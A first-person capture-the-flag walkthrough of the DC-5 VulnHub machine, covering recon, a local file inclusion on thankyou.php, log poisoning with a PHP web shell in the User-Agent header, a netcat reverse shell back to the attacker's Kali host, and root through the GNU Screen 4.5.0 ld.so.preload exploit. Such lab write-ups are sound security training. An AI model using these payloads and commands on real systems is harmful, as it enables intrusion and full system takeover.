# DC-5 (VulnHub) Walkthrough

**Target:** DC-5 (10.0.2.8, DHCP-assigned on NAT Network — reconfirmed via `sudo nmap -sn 10.0.2.0/24`)
**Attacker:** Kali Linux (10.0.2.3)

## Recon

I started with a full port and service scan rather than a default top-1000, since the DC series is known for hiding services on non-standard ports:

```
nmap -sC -sV -p- 10.0.2.8
```

This came back with three open ports: `80/tcp` (nginx 1.6.2), `111/tcp` (rpcbind), and `40401/tcp` (status, tied to rpc.statd). There was no NFS export alongside rpcbind, so I didn't chase that further — port 80 was clearly the intended way in.

Viewing the homepage source showed a static site with a nav menu (Home, Solutions, About Us, FAQ, Contact) and no useful comments. I ran a directory/file brute force to look past what was linked:

```
gobuster dir -u http://10.0.2.8 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
```

Two results stood out: `footer.php`, at only 17 bytes — far too small to be a real page, clearly meant to be `include()`d by something rather than requested directly — and `thankyou.php`, which wasn't linked in the nav at all, the classic sign of a form-processing endpoint.

## Finding the LFI

Requesting `footer.php` directly just returned a "Copyright © `<year>`" line, but the year changed on every single request with no cookies or parameters involved — a strong hint that something dynamic was happening server-side, even before I knew what.

My first instinct was to chase that changing year as the vulnerability itself. I spent a while fuzzing header names against `footer.php` directly (`wfuzz` against a header-name wordlist, `curl -H "File: ..."`, etc.) — all dead ends, because I was attacking the wrong file. `footer.php` is just the tiny fragment that gets included; it never processes input on its own. The actual form handler is `thankyou.php`, which `contact.php`'s form posts to.

Once I looked up a public walkthrough of DC-5 and confirmed its known pattern — LFI through a `file` GET parameter on `thankyou.php` — I verified it directly:

```
curl -s "http://10.0.2.8/thankyou.php?firstname=a&lastname=a&file=/etc/passwd"
```

`/etc/passwd`'s contents came back embedded in the response's footer div — confirmed Local File Inclusion, and it also revealed a local user account, `dc`.

## Exploitation

LFI alone gives file read, not code execution — I needed to get PHP code into a file `thankyou.php` would then include. Nginx logs the `User-Agent` header verbatim into `access.log` for every request, so I planted a PHP payload there:

```
curl -s "http://10.0.2.8/thankyou.php?firstname=a&lastname=a" -A "<?php system(\$_GET['cmd']); ?>"
```

Then triggered it by including the poisoned log through the same LFI, with a `cmd` parameter for the payload to execute:

```
curl -s "http://10.0.2.8/thankyou.php?firstname=a&lastname=a&file=/var/log/nginx/access.log&cmd=id"
```

`uid=33(www-data) gid=33(www-data)` came back embedded in the log noise — confirmed remote code execution as `www-data`. I upgraded this to an interactive reverse shell using the same chain:

```
nc -lvnp 4444                                                    # on Kali
curl -s ".../thankyou.php?file=/var/log/nginx/access.log&cmd=nc+-e+/bin/bash+10.0.2.3+4444"
```

Once connected, I upgraded the shell to a full TTY:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

The upgraded shell showed no visible prompt string at all, which I initially mistook for a failed upgrade — `whoami` confirmed it was actually alive and responsive the whole time.

## Privilege Escalation

I enumerated SUID binaries to look for a privesc path:

```
find / -perm -u=s -type f 2>/dev/null
```

`/bin/screen-4.5.0` stood out immediately — a non-standard, explicitly versioned binary name. `searchsploit screen 4.5.0` on Kali confirmed **CVE-2017-5618**: SUID GNU Screen 4.5.0 fails to validate the path passed to its `-L` (logfile) flag, letting a local user get root-owned screen to write attacker-controlled content to an arbitrary path.

The exploit chain (`screenroot.sh`, Exploit-DB 41154):
1. Compile a shared library (`libhax.so`) whose constructor chmods a target binary to SUID-root and cleans up after itself.
2. Compile a trivial shell dropper (`rootshell`) that drops to uid 0 and execs `/bin/sh` — inert until made SUID-root.
3. Abuse SUID `screen -D -m -L ld.so.preload ...` from `/etc` to write a root-owned `/etc/ld.so.preload` pointing at `libhax.so`.
4. Trigger the dynamic linker to load it by running `screen -ls` (screen itself is SUID root) — this fires the constructor, flipping `rootshell` to SUID-root.
5. Run `rootshell` for a root shell.

This is where I hit the session's real wrong turn. Compiling `libhax.so` on the box failed with:

```
gcc: error trying to exec 'cc1': execvp: No such file or directory
```

despite `gcc` and its version both being confirmed present. I worked through it step by step instead of guessing:

- `find / -name "cc1" 2>/dev/null` → `cc1` existed at `/usr/lib/gcc/x86_64-linux-gnu/4.9/cc1`, ruling out a missing package.
- Running `cc1` directly (`--version`) succeeded with exit code 0, ruling out a broken or corrupted binary.
- Checked and ruled out both an earlier broken `/etc/ld.so.preload` (already cleared to 0 bytes at that point) and restrictive `ulimit`s (max user processes was 3935 — not the cause).
- `gcc -print-prog-name=cc1` returned the bare word `cc1` instead of a full path — meaning gcc's internal toolchain search wasn't resolving, so it fell back to `$PATH` alone via `execvp()`, and `cc1`'s directory simply wasn't on it.

Fixed with:
```
export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/4.9
```

After that, both `libhax.so` and `rootshell` compiled cleanly on the first try.

## Capturing the Flag

```
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
id                              # uid=0(root) gid=0(root)
find / -iname "*flag*" 2>/dev/null
cat /root/thisistheflag.txt
```

Root confirmed, flag captured at `/root/thisistheflag.txt`.

## Summary

| Stage | Technique |
|---|---|
| Recon | Full-port Nmap scan (`-sC -sV -p-`) + `gobuster` directory brute force |
| Finding the LFI | Unsanitized `file` GET parameter on `thankyou.php`, included via PHP `include()` |
| Exploitation | Log poisoning — PHP payload via `User-Agent` header, triggered through the same LFI, escalated to a reverse shell |
| Privilege Escalation | SUID `screen-4.5.0` (CVE-2017-5618) — `/etc/ld.so.preload` abuse via `-L` logfile flag |
| Capturing the Flag | Root shell via `libhax.so` constructor flipping `rootshell` to SUID-root |
